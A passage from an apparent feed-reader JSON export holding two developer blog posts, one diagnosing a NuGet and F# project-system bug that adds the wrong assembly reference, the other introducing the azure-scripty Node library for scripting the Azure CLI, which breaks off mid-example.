direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum15\" style=\"color: #606060\">15:</span>...</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum16\" style=\"color: #606060\">16:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum17\" style=\"color: #606060\">17:</span>TrySetCopyLocal(reference);</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum18\" style=\"color: #606060\">18:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum19\" style=\"color: #606060\">19:</span><span style=\"color: #008000\">// This happens if the assembly appears in any of the search</span></pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum20\" style=\"color: #606060\">20:</span><span style=\"color: #008000\">// paths that VS uses to locate assembly references. Most commonly,</span></pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum21\" style=\"color: #606060\">21:</span><span style=\"color: #008000\">// it happens if this assembly is in the GAC or in the output path.</span></pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum22\" style=\"color: #606060\">22:</span><span style=\"color: #0000ff\">if</span>(!reference.Path.Equals(fullPath, StringComparison.OrdinalIgnoreCase))</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum23\" style=\"color: #606060\">23:</span>{</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum24\" style=\"color: #606060\">24:</span><span style=\"color: #008000\">// Get the msbuild project for this project</span></pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum25\" style=\"color: #606060\">25:</span>MsBuildProject buildProject = Project.AsMSBuildProject();</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum26\" style=\"color: #606060\">26:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum27\" style=\"color: #606060\">27:</span><span style=\"color: #0000ff\">if</span>(buildProject !=<span style=\"color: #0000ff\">null</span>)</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum28\" style=\"color: #606060\">28:</span>{</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum29\" style=\"color: #606060\">29:</span><span style=\"color: #008000\">// Get the assembly name of the reference we are trying to add</span></pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum30\" style=\"color: #606060\">30:</span>AssemblyName assemblyName = AssemblyName.GetAssemblyName(fullPath);</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum31\" style=\"color: #606060\">31:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum32\" style=\"color: #606060\">32:</span><span style=\"color: #008000\">// Try to find the item for the assembly name</span></pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum33\" style=\"color: #606060\">33:</span>MsBuildProjectItem item =</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum34\" style=\"color: #606060\">34:</span>(from assemblyReferenceNode<span style=\"color: #0000ff\">in</span>buildProject.GetAssemblyReferences()</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum35\" style=\"color: #606060\">35:</span><span style=\"color: #0000ff\">where</span>AssemblyNamesMatch(assemblyName, assemblyReferenceNode.Item2)</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum36\" style=\"color: #606060\">36:</span>select assemblyReferenceNode.Item1).FirstOrDefault();</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum37\" style=\"color: #606060\">37:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum38\" style=\"color: #606060\">38:</span><span style=\"color: #0000ff\">if</span>(item !=<span style=\"color: #0000ff\">null</span>)</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum39\" style=\"color: #606060\">39:</span>{</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum40\" style=\"color: #606060\">40:</span><span style=\"color: #008000\">// Add the&lt;HintPath&gt; metadata item as a relative path</span></pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum41\" style=\"color: #606060\">41:</span>item.SetMetadataValue(<span style=\"color: #006080\">\"HintPath\"</span>, referencePath);</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum42\" style=\"color: #606060\">42:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum43\" style=\"color: #606060\">43:</span><span style=\"color: #008000\">// Save the project after we've modified it.</span></pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum44\" style=\"color: #606060\">44:</span>Project.Save();</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum45\" style=\"color: #606060\">45:</span>}</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum46\" style=\"color: #606060\">46:</span>}</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum47\" style=\"color: #606060\">47:</span>}</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum48\" style=\"color: #606060\">48:</span>}</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum49\" style=\"color: #606060\">49:</span><span style=\"color: #0000ff\">catch</span>(Exception e)</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum50\" style=\"color: #606060\">50:</span>{</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum51\" style=\"color: #606060\">51:</span>...</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum52\" style=\"color: #606060\">52:</span>}</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum53\" style=\"color: #606060\">53:</span>}</pre><!--CRLF--></div></div><p>On line 13 NuGet calls out to the F# project system and asks it to add a reference to the assembly at the given path. We assume that the F# project system then does the wrong thing by searching for the assembly name anywhere in the GAC or the output directory rather than referencing the explicit assembly NuGet is asking it to reference.</p><p>Interestingly, it looks as if the NuGet team have attempted to code a work-around for this bug from line 22 onwards. Could this be why C# projects don’t exhibit this behaviour? Unfortunately the work around doesn’t work in the F# case. We think it’s because F# doesn’t respect assembly versions and will happily replace any requested assembly with another one so long as it’s got the same simple name. At line 33, no assemblies are found in the fsproj file because the ‘AssemblyNamesMatch’ function does an exact match using all four elements of the full assembly name (simple name, version, culture, and key) and of course the assembly that the F# project system has found and added has a different version.</p><p>So, come on F# team, pull your finger out and fix the Visual Studio F# project system. In the meantime, in my next post I’ll talk about some of things our team, and especially the excellent Michael Newton (<a href=\"https://twitter.com/mavnn\">@mavnn</a>) has been doing to try and work around these problems.</p><p><strong>Update:</strong>Micheal Newton has<a href=\"http://mikehadlow.blogspot.co.uk/2013/06/guest-post-working-around-fnuget.html\">written a guest post</a>to explain some of things we are doing to work around these problems.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":995}}
{"k":"0000000082","o":"0000017809","v":"001"}
{"_id":996,"_uid":996,"_dt":1373741607081,"_s":"d980401782f85027b0af67a657d0e889"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/DKan_BACt3U/","title":"azure-scripty – Azure CLI scripting made even easier","published":{"$wrap":"$date","v":1364778373000,"h":"2013-04-01T01:06:13.000Z"},"starred":false,"read":false,"content":"<p><strong>Note: At any time if you want to just get it and jump in, “npm install azure-scripty” and start scripting</strong></p><p>If you are using our azure-cli then you might have though of creating automation scripts to package up common tasks. A while ago I posted on how you can <a href=\"http://codebetter.com/glennblock/2012/12/25/simple-bash-scripting-for-azure-cli/\">achieve</a> some script-ability just using bash tools. Basically the techniques I listed there involve piping text from command to command and using tools like grep and awk to parse the results in order to feed to the next command.</p><p>It turns out there’s another way, and one that is much closer to the kind of fidelity you an achieve with Powershell. Sound interesting? keep reading. It turns out the majority (like 99%) of our cmds can return JSON objects if you apply the –json switch.</p><p>For example if I do “azure site list –json” here’s what I get.</p><p><a href=\"http://codebetter.com/glennblock/files/2013/04/ScreenShot20130331at5.35.57PM.png\"><img title=\"Screen Shot 2013-03-31 at 5.35.57 PM\" style=\"border-left-width: 0px;border-right-width: 0px;border-bottom-width: 0px;border-top-width: 0px\" border=\"0\" alt=\"Screen Shot 2013-03-31 at 5.35.57 PM\" src=\"http://codebetter.com/glennblock/files/2013/04/ScreenShot20130331at5.35.57PM_thumb.png\" width=\"420\" height=\"283\"></a></p><p>That means that I can take that result and parse it into a JSON object which I can then easily manipulate. Potentially I could even pipe results in from one cmd to the other. I could even imagine being able to define cmds as JSON objects so that I could script out my tasks in a more object friendly fashion. I could then wrap that all up in a nice pretty box to be used by myself or others.</p><p><a href=\"http://codebetter.com/glennblock/files/2013/04/MP9004028941.jpg\"><img title=\"MP900402894[1]\" style=\"border-left-width: 0px;border-right-width: 0px;border-bottom-width: 0px;border-top-width: 0px\" border=\"0\" alt=\"MP900402894[1]\" src=\"http://codebetter.com/glennblock/files/2013/04/MP9004028941_thumb.jpg\" width=\"240\" height=\"180\"></a></p><p>And <i>that</i> is what <a href=\"https://github.com/glennblock/azure-scripty\">azure-scripty</a> is about. (Kudos to <a href=\"http://twitter.com/jpscripter\">@JpScripter </a>for reminding me I need to post.)</p><p>azure-scripty gives you a JSON oriented API that you can use within a node script for automation tasks. It lets you combine the power of raw node with the capabilities of our azure-cli. One thing that is also really nice is it leverages the knowledge you already have of the CLI. As it says on the github page, “if you know the CLI you know scripty.”</p><p>azure-scripty offers you the following:</p><ul><li>Works anywhere node works i.e. Windows, Linux, Mac, Nodecopter <img src='http://codebetter.com/glennblock/wp-includes/images/smilies/icon_smile.gif' alt=':-)' class='wp-smiley' /><li>Author using pure string command or JSON object command styles.<li>Uses the standard node callback model<li>Batching multiple commands together.<li>Piping results from one command to the other </li></ul><p>Here’s a few examples to give you an idea:</p><h2>String command style</h2><script src=\"http://gist.github.com/5282664.js\"></script><noscript><link rel=\"stylesheet\" href=\"https://gist.github.com/assets/embed-bfcadee384027982121fdeb9930e78b2.css\"><div id=\"gist5282664\" class=\"gist\"><div class=\"gist-file\"><div class=\"gist-data gist-syntax\"><div class=\"file-data\"><table cellpadding=\"0\" cellspacing=\"0\" class=\"lines highlight\"><tr><td class=\"line-numbers\"><span class=\"line-number\" id=\"file-gistfile1-js-L1\" rel=\"file-gistfile1-js-L1\">1</span><span class=\"line-number\" id=\"file-gistfile1-js-L2\" rel=\"file-gistfile1-js-L2\">2</span><span class=\"line-number\" id=\"file-gistfile1-js-L3\" rel=\"file-gistfile1-js-L3\">3</span><span class=\"line-number\" id=\"file-gistfile1-js-L4\" rel=\"file-gistfile1-js-L4\">4</span></td><td class=\"line-data\"><pre class=\"line-pre\"><div class=\"line\" id=\"file-gistfile1-js-LC1\"><span class=\"kd\">var</span> <span class=\"nx\">scripty</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">'azure-scripty'</span><span class=\"p\">);</span></div><div class=\"line\" id=\"file-gistfile1-js-LC2\"><span class=\"nx\">scripty</span><span class=\"p\">.</span><span class=\"nx\">invoke</span><span class=\"p\">(</span><span class=\"s1\">'site list'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">,</span> <span class=\"nx\">results</span><span class=\"p\">)</span> <span class=\"p\">{</span></div><div class=\"line\" id=\"file-gistfile1-js-LC3\">  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"my sites\\n\"</span> <span class=\"o\">+</span> <span class=\"nx\">results</span><span class=\"p\">);</span></div><div class=\"line\" id=\"file-gistfile1-js-LC4\"><span class=\"p\">});</span></div></pre></td></tr></table></div></div><div class=\"gist-meta\"><a href=\"https://gist.github.com/glennblock/5282664/raw/da17bd9cad47373ab2f278e485fa3d827091085c/gistfile1.js\" style=\"float:right\">view raw</a><a href=\"https://gist.github.com/glennblock/5282664#file-gistfile1-js\" style=\"float:right; margin-right:10px; color:#666;\">gistfile1.js</a><a href=\"https://gist.github.com/glennblock/5282664\">This Gist</a> brought to you by <a href=\"https://github.com\">GitHub</a>.</div></div></div></noscript><p>This will list out my websites in json format.</p><h2>Object command style</h2><script src=\"http://gist.github.com/5282673.js\"></script><noscript><link rel=\"stylesheet\" href=\"https://gist.github.com/assets/embed-bfcadee384027982121fdeb9930e78b2.css\"><div id=\"gist5282673\" class=\"gist\"><div class=\"gist-file\"><div class=\"gist-data gist-syntax\"><div class=\"file-data\"><table cellpadding=\"0\" cellspacing=\"0\" class=\"lines highlight\"><tr><td class=\"line-numbers\"><span class=\"line-number\" id=\"file-gistfile1-js-L1\" rel=\"file-gistfile1-js-L1\">1</span><span class=\"line-number\" id=\"file-gistfile1-js-L2\" rel=\"file-gistfile1-js-L2\">2</span><span class=\"line-number\" id=\"file-gistfile1-js-L3\" rel=\"file-gistfile1-js-L3\">3</span><span class=\"line-number\" id=\"file-gistfile1-js-L4\" rel=\"file-gistfile1-js-L4\">4</span><span class=\"line-number\" id=\"file-gistfile1-js-L5\" rel=\"file-gistfile1-js-L5\">5</span><span class=\"line-number\" id=\"file-gistfile1-js-L6\" rel=\"file-gistfile1-js-L6\">6</span><span class=\"line-number\" id=\"file-gistfile1-js-L7\" rel=\"file-gistfile1-js-L7\">7</span><span class=\"line-number\" id=\"file-gistfile1-js-L8\" rel=\"file-gistfile1-js-L8\">8</span></td><td class=\"line-data\"><pre class=\"line-pre\"><div class=\"line\" id=\"file-gistfile1-js-LC1\"><span class=\"kd\">var</span> <span class=\"nx\">scripty</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">'azure-scripty'</span><span class=\"p\">);</span></div><div class=\"line\" id=\"file-gistfile1-js-LC2\"><span class=\"nx\">cmd</span> <span class=\"o\">=</span> <span class=\"p\">{</span></div><div class=\"line\" id=\"file-gistfile1-js-LC3\">  <span class=\"nx\">command</span><span class=\"o\">:</span> <span class=\"s1\">'mobile create'</span><span class=\"p\">,</span></div><div class=\"line\" id=\"file-gistfile1-js-LC4\">  <span class=\"nx\">positional</span><span class=\"o\">:</span> <span class=\"p\">[</span><span class=\"s1\">'mymobileservice'</span><span class=\"p\">,</span> <span class=\"s1\">'sqladmin'</span><span class=\"p\">,</span> <span class=\"s1\">'myP@ssw0rd!'</span><span class=\"p\">],</span></div><div class=\"line\" id=\"file-gistfile1-js-LC5\">  <span class=\"nx\">sqlServer</span><span class=\"o\">:</span> <span class=\"s1\">'VMF1ASD'</span><span class=\"p\">,</span></div><div class=\"line\" id=\"file-gistfile1-js-LC6\">  <span class=\"nx\">sqlDb</span><span class=\"o\">:</span> <span class=\"s1\">'mydb'</span></div><div class=\"line\" id=\"file-gistfile1-js-LC7\"><span class=\"p\">};</span></div><div class=\"line\" id=\"file-gistfile1-js-LC8\"><span class=\"nx\">scripty</span><span class=\"p\">.</span><span class=\"nx\">invoke</span><span class=\"p\">(</span><span class=\"nx\">cmd</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{});</span></div></pre></td></tr></table></div></div><div class=\"gist-meta\"><a href=\"https://gist.github.com/glennblock/5282673/raw/e6ec5be72beb6c6b3703a04545643e8424b2cdab/gistfile1.js\" style=\"float:right\">view raw</a><a href=\"https://gist.github.com/glennblock/5282673#file-gistfile1-js\" style=\"float:right; margin-right:10px; color:#666;\">gistfile1.js</a><a href=\"https://gist.github.com/glennblock/5282673\">This Gist</a> brought to you by <a href=\"https://github.com\">GitHub</a>.</div></div></div></noscript><p>This sample creates a new mobile service using the object oriented style. Notice you can pass fixed position args, with all other named args being by convention.</p><h2></h2><h2></h2><h2>Batching</h2><script src=\"http://gist.github.com/5282679.js\"></script><noscript><link rel=\"stylesheet\" href=\"https://gist.github.com/assets/embed-bfcadee384027982121fdeb9930e78b2.css\"><div id=\"gist5282679\" class=\"gist\"><div class=\"gist-file\"><div class=\"gist-data gist-syntax\"><div class=\"file-data\"><table cellpadding=\"0\" cellspacing=\"0\" class=\"lines highlight\"><tr><td class=\"line-numbers\"><span class=\"line-number\" id=\"file-gistfile1-js-L1\" rel=\"file-gistfile1-js-L1\">1</span><span class=\"line-number\" id=\"file-gistfile1-js-L2\" rel=\"file-gistfile1-js-L2\">2</span><span class=\"line-number\" id=\"file-gistfile1-js-L3\" rel=\"file-gistfile1-js-L3\">3</span><span class=\"line-number\" id=\"file-gistfile1-js-L4\" rel=\"file-gistfile1-js-L4\">4</span><span class=\"line-number\" id=\"file-gistfile1-js-L5\" rel=\"file-gistfile1-js-L5\">5</span><span class=\"line-number\" id=\"file-gistfile1-js-L6\" rel=\"file-gistfile1-js-L6\">6</span><span class=\"line-number\" id=\"file-gistfile1-js-L7\" rel=\"file-gistfile1-js-L7\">7</span><span class=\"line-number\" id=\"file-gistfile1-js-L8\" rel=\"file-gistfile1-js-L8\">8</span><span class=\"line-number\" id=\"file-gistfile1-js-L9\" rel=\"file-gistfile1-js-L9\">9</span><span class=\"line-number\" id=\"file-gistfile1-js-L10\" rel=\"file-gistfile1-js-L10\">10</span><span class=\"line-number\" id=\"file-gistfile1-js-L11\" rel=\"file-gistfile1-js-L11\">11</span><span class=\"line-number\" id=\"file-gistfile1-js-L12\" rel=\"file-gistfile1-js-L12\">12</span><span class=\"line-number\" id=\"file-gistfile1-js-L13\" rel=\"file-gistfile1-js-L13\">13</span><span class=\"line-number\" id=\"file-gistfile1-js-L14\" rel=\"file-gistfile1-js-L14\">14</span><span class=\"line-number\" id=\"file-gistfile1-js-L15\" rel=\"file-gistfile1-js-L15\">15</span><span class=\"line-number\" id=\"file-gistfile1-js-L16\" rel=\"file-gistfile1-js-L16\">16</span><span class=\"line-number\" id=\"file-gistfile1-js-L17\" rel=\"file-gistfile1-js-L17\">17</span><span class=\"line-number\" id=\"file-gistfile1-js-L18\" rel=\"file-gistfile1-js-L18\">18</span></td><td class=\"line-data\"><pre class=\"line-pre\"><div class=\"line\" id=\"file-gistfile1-js-LC1\"><span class=\"kd\">var</span> <span class=\"nx\">scripty</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">'azure-scripty'</span><span class=\"p\">);</span></div><div class=\"line\" id=\"file-gistfile1-js-LC2\"><span class=\"nx\">cmds</span> <span class=\"o\">=</span> <span class=\"p\">[</span></div><div class=\"line\" id=\"file-gistfile1-js-LC3\">  <span class=\"p\">{</span></div><div class=\"line\" id=\"file-gistfile1-js-LC4\">    <span class=\"nx\">command</span><span 